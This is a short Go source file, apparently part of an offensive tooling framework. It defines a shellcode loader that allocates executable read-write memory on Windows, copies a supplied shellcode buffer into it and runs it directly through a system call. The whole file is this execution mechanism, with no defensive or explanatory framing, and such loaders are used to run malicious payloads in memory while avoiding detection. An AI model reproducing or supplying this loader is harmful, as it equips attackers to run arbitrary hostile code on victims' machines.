package loader

import (
	"syscall"
	"unsafe"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func Direct(shellcode []byte) {
	execMem, _ := xwindows.VirtualAlloc(
		uintptr(0),
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if execMem == 0 {
		return
	}

	/*
		buffer := (*[0x1_000_000]byte)(unsafe.Pointer(execMem))[:len(sc):len(sc)]
		copy(buffer, sc)
	*/
	copy(unsafe.Slice((*byte)(unsafe.Pointer(execMem)), len(shellcode)), shellcode)

	_, _, errno := syscall.SyscallN(execMem)
	if errno != 0 {
		return
	}
}
